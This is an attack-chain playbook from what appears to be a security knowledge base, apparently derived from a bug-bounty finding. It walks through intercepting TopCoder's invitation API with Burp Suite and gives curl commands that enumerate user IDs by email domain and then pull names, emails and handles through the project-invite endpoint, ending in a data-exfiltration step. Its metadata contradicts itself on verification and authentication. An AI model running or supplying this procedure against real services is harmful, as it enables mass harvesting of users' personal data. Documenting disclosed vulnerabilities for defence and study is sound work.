---
tags:
  - information-disclosure
  - pii-leak
  - api-vulnerability
  - account-discovery
type: attack_chain
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Discovery]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Enumerate-User-IDs-via-Member-Search-Endpoint]]'
  - '[[procedures/Disclose-PII-via-Project-Invite-Endpoint]]'
step_count: 7
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:25:17.384Z'
description: >-
  A multi-stage information disclosure attack exploiting insufficient access
  controls in TopCoder's API to enumerate user IDs by email domain and retrieve
  full PII including emails, names, and handles for arbitrary users.
skill_level: intermediate
impact_level: high
id: 5d9125bc-24e0-4ca3-b4f7-d94ae826e53d
validated: true
mitre_tactics:
  - '[[Discovery]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Account Discovery]]'
---
# PII Disclosure via Chained Member Search and Project Invite Endpoints in TopCoder

Multi-stage attack chain demonstrating information disclosure in TopCoder's project invitation system by exploiting unauthenticated search queries to enumerate user IDs and then using invite endpoints to fetch detailed PII.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 7 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Navigate to Projects] --> B[Access Manage Invitations]
    B --> C[Intercept Requests with Burp]
    C --> D[Manipulate Search for User IDs]
    D --> E[Use Invite to Fetch PII]
    E --> F[Exfiltrate Data]

    style A fill:#e74c3c
    style B fill:#e74c3c
    style C fill:#f39c12
    style D fill:#f39c12
    style E fill:#3498db
    style F fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Burp-Suite]]

### Target Environment

- Web platform with access to https://connect.topcoder.com
- REST API on api.topcoder.com
- Authenticated session (via Authorization header)

### Initial Access Requirements

- Valid TopCoder account with project access
- Network access to TopCoder domains
- Burp Suite proxy configured for traffic interception

## Detailed Attack Procedures

### Step 1: Navigate to the Projects Page

**Objective**: Gain initial access to the project interface to set up the attack context.

**Instructions**: Open a browser and navigate to the TopCoder projects page.

```bash
# No command needed; use browser
curl -k https://connect.topcoder.com/projects  # Optional curl for verification
```

**Expected Output**: Projects list loads, allowing selection of a project.

**Success Indicators**:
- Projects page accessible
- Authenticated session active

### Step 2: Select an Existing Project or Create a New One

**Objective**: Establish a project context required for the invitation workflow.

**Instructions**: Choose an existing project from the list or create a new one via the interface.

```bash
# Browser action; no direct command
```

**Expected Output**: Project dashboard opens.

**Success Indicators**:
- Project selected or created
- Manage options available

### Step 3: Select the 'Manage Invitations' Option

**Objective**: Enter the invitation interface to trigger relevant API calls.

**Instructions**: Click on 'Manage Invitations' in the left sidebar of the project interface.

```bash
# Browser action
```

**Expected Output**: Invitation form loads.

**Success Indicators**:
- Form for entering username/email appears

### Step 4: Enter Username/Email to Trigger Requests

**Objective**: Initiate the normal invitation flow to capture baseline requests.

**Instructions**: Input a test username or email in the form to trigger GET search and POST invite requests.

```bash
# Browser submits form, interceptable via proxy
```

**Expected Output**: Requests sent to API endpoints.

**Success Indicators**:
- Network traffic shows GET /v3/members/_search/ and POST /v5/projects/{id}/members/invite/

### Step 5: Intercept Requests with Burp Suite
procedure: [[procedures/Enumerate-User-IDs-via-Member-Search-Endpoint]]

**Objective**: Capture and redirect requests for manipulation.

**Instructions**: Configure Burp Suite as a proxy, intercept the GET and POST during form submission, and send to Repeater.

**Expected Output**: Requests available in Burp Repeater for editing.

**Success Indicators**:
- GET and POST captured
- Repeater tab opens with requests

### Step 6: Manipulate GET Request for User ID Enumeration
procedure: [[procedures/Enumerate-User-IDs-via-Member-Search-Endpoint]]

**Objective**: Exploit the search endpoint to broadly enumerate user IDs by email domain.

**Instructions**: In Burp Repeater, modify the GET request's query parameter to search by domain (e.g., email:@wearehackerone.com) and set limit=1000. Execute using [[commands/topcoder-member-search-enumerate]] equivalent in Burp or curl.

```bash
# Equivalent curl for the manipulated GET
curl -X GET "https://api.topcoder.com/v3/members/_search/?fields=userId,handle,photoURL,firstName,lastName,details,email&query=email:@wearehackerone.com&limit=1000" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Accept: application/json"
```

**Expected Output**: JSON array of users with userId, handle, firstName, lastName, email.

**Success Indicators**:
- Multiple user objects returned
- User IDs collected for next step

### Step 7: Use POST Request to Retrieve PII
procedure: [[procedures/Disclose-PII-via-Project-Invite-Endpoint]]

**Objective**: Leverage collected user IDs to disclose full PII via the invite endpoint.

**Instructions**: In Burp Repeater, update the POST body with an array of userIds from Step 6, set role to "customer", and execute using [[commands/topcoder-project-invite-disclose]] equivalent.

```bash
# Equivalent curl for the POST
curl -X POST "https://api.topcoder.com/v5/projects/13482/members/invite/?fields=id,projectId,userId,email,role,status,createdAt,updatedAt,createdBy,updatedBy,handle,firstName,lastName,photoURL" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"userIds":[41008482, 41008483, 41008486, 41012377],"role":"customer"}'
```

**Expected Output**: JSON with detailed user info including full emails, names, handles, and roles.

**Success Indicators**:
- PII disclosed for target users
- No authorization errors

## Attack Chain Summary

### Key Achievements

1. Enumerated hundreds of user IDs by manipulating email domain searches without proper auth checks.
2. Retrieved complete PII for arbitrary users, including admins, via unfiltered invite responses.
3. Enabled broader reconnaissance for internal company data collection.

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Account Discovery]] Account Discovery

### MITRE ATT&CK Tactics

- [[Discovery]] Discovery
- [[Collection]] Collection

---

*Last updated: 2023-10-01T00:00:00Z*
